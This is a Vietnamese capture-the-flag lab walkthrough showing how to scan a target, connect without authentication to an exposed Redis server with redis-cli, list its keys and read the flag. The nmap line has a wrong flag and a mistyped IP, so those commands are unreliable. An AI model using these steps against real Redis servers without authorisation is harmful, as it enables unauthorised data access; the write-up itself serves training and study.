>Trong phần lab này sẽ tập trung vào thu thập thông tin của server Redis từ xa và trích xuất database nhằm lấy flag. Sẽ học được cách sử dụng redis-cli, một script sử dụng tương tác lệnh (command line interface) để giao tiếp với Redis. Ta cũng sẽ được tìm hiểu qua về database từ khóa: giá trị (key-value database).
### 1. Tìm kiếm thông tin target
###### IP: 10.129.251.12
##### + Kiểm tra kết nối:
` ping 10.129.251.12 `
##### + Kiểm tra cổng và dịch vụ
` nmap -p- -Sv 10.129.261.12 `
###### -p- : tất cả cổng (mặc định nmap chỉ quét 1000 cổng đầu tiên)
##### => port 6379/tcp: Service Redis
###### Redis (REmote Dictionary Server): một database trong bộ nhớ, phụ thuộc vào bộ nhớ chính để chứa data (database được quản lý bởi RAM trong hệ thống), mã nguồn mở và lưu data dưới dạng key-value.

### 2. Kết nối và truy xuất dữ liệu trong Redis
##### + Để kết nối với Redis, cần cài đặt redis-cli:
` sudo apt install redis-tools `
##### + Kết nối với database: 
``` 
redis-cli -h 10.129.251.12
10.129.251.12:6379>
```
###### -h : cụ thể hostname của target sẽ kết nối.
##### + Sau khi kết nối thành công, ta có thể kiểm tra thông tin của Redis server:
```
10.129.251.12:6379> info

# Server
redis_version:5.0.7
redis_git_shal:00000000
redis_git_dirty:0
redis_build_id:66bd629f924ac924
...
# Keyspace
db0:keys=4, expires,avg_ttl=0
```
###### Phần keyspace cung cấp thông số của thư viện chính của mỗi database. Trong trường hợp trên, ta thấy chỉ có 1 database tồn tại là db0 với index = 0.
##### + Chọn database db0:
``` 
10.129.251.12:6379> select 0
OK
```
###### select: chọn database dựa trên index.
##### + Xem các dữ liệu (keys) đang có trong database và truy xuất:
```
10.129.251.12:6379> keys *
1) "temp"
2) "stor"
3) "numb"
4) "flag"
10.129.251.12:6379> get flag
```
###### keys *: liệt kê tất cả key tồn tại trong  database.
###### get: lấy key (flag)
